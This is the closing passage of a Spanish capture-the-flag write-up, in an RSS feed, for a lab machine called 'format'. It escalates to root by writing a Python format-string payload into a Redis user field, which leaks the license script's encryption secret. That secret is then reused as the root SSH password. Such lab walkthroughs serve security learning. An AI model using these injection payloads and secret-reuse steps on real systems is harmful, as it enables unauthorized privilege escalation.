+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">9</span><span>gAAAAABm2KSrLZ4-8N7h12sTktgCH_tcMFYStC1_4C9GV9ssRC2DsbFCta7zs5cScBclfOJxLvWiSHB-qXxftcnyUOYvoiynkpXt5ifmibRVyuVkJb8YPAfozSU2PDoY9v308Szz10Pcglz_m9TGJ4LzA-iebZnf_XfVFEie0reV7Gngq0EZqqQ=
+</span></span></code></pre></div>
+<p>Y vemos una cosa de la cual sabiendo la vulnerabilidad en <code>format</code> nos podemos aprovechar.</p>
+<p>Vemos que se refleja el nombre del usuario, podríamos modificar el <code>firstlast</code> e intentar leer el <code>secret</code> ya que esta variable ya está definida en tiempo de ejecución.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>license_key = (prefix + username + <span style="color:#0ff;font-weight:bold">&#34;</span><span style="color:#0ff;font-weight:bold">{license.license}</span><span style="color:#0ff;font-weight:bold">&#34;</span> + firstlast).format(license=l)</span></span></code></pre></div>
+<p>Creamos un usuario <code>test</code> y ahora podríamos seguir el artículo anterior y siguiendo el formato <code>{people_obj.__init__.__globals__[CONFIG][KEY]}</code> podríamos acceder al objeto <code>license</code> y a través del <code>__init__</code> podríamos acceder a la variable <code>secret_encoded</code> que en principio contiene la clave de encriptación en texto plano.</p>
+<p>Ahora cambiamos el campo <code>first-name</code> del usuario <code>test</code> para llevar a cabo esta explotación.</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>redis /var/run/redis/redis.sock&gt; HSET test first-name {license.__init__.__globals__[secret_encoded]}
+(integer) 0</code></pre>
+<p>Vemos que se ha actualizado correctamente.</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>redis /var/run/redis/redis.sock&gt; HGETALL test
+ 1) &#34;username&#34;
+ 2) &#34;test&#34;
+ 3) &#34;password&#34;
+ 4) &#34;test&#34;
+ 5) &#34;first-name&#34;
+ 6) &#34;{license.__init__.__globals__[secret_encoded]}&#34;
+ 7) &#34;last-name&#34;
+ 8) &#34;test&#34;
+ 9) &#34;pro&#34;
+10) &#34;false&#34;</code></pre>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>cooper@format:/usr/bin$ sudo /usr/bin/license -p test
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span><span style="color:#f00"></span>Plaintext license key:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>------------------------------------------------------
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>microblogtestPI~{?|n&gt;347`([oiD%]]}+TmLI7):-Yyi|_s)v6Nb&#39;unCR4ckaBL3Pa$$w0rd&#39;test
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span><span style="color:#f00"></span>Encrypted license key (distribute to customer):
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8</span><span>------------------------------------------------------
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">9</span><span>gAAAAABm2Kd0vioajxidv-Ha77lwDvdWwKcUaS_QJVpmY1Lk9LMoKbEH_d5Hy8rD3uB1i_3Wm_GUp0iaIb9Dwa6iX98Vg57Bwq_qhtPy7LpQwMT0dAlqTBHb27AefkNHkjSImC7Puhd4Cp06MPhodX19OJHH8ZOfrQ8ttRuK4v-cnQCdFDj5S1A=
+</span></span></code></pre></div>
+<p>Y donde tendría que haberse escrito <code>testtest</code> se ha escrito <code>'unCR4ckaBL3Pa$$w0rd'test</code>, así que <code>unCR4ckaBL3Pa$$w0rd</code> es el <code>secret</code> que se usa para encriptar la licencia.</p>
+<p>Ahora podemos migrar al usuario <code>root</code> con esta clave.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>cooper@format:/usr/bin$ ssh root@127.0.0.1
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>The authenticity of host &#39;127.0.0.1 (127.0.0.1)&#39; can&#39;t be established.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>ECDSA key fingerprint is SHA256:5g/lIE6E8fQVRIJhCTQ/l6jE2Sh56FYGSFi4iLbQQko.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>Warning: Permanently added &#39;127.0.0.1&#39; (ECDSA) to the list of known hosts.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>root@127.0.0.1&#39;s password: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>Linux format 5.10.0-22-amd64 #1 SMP Debian 5.10.178-3 (2023-04-22) x86_64
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span><span style="color:#f00"></span>The programs included with the Debian GNU/Linux system are free software;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>the exact distribution terms for each program are described in the
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>individual files in /usr/share/doc/*/copyright.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span><span style="color:#f00"></span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>permitted by applicable law.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>Last login: Tue May 23 18:43:13 2023 from 10.10.14.41
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>root@format:~# id
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>uid=0(root) gid=0(root) groups=0(root)
+</span></span></code></pre></div>
+<p>Podemos leer la flag de <code>root</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>root@format:~# cat root.txt 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>b7483a6a2fbd...
+</span></span></code></pre></div>
+<p>¡Y ya estaría!</p>
+<p>Happy Hacking! 🚀</p>
+]]></content:encoded>
+    </item>
+  </channel>
+</rss>
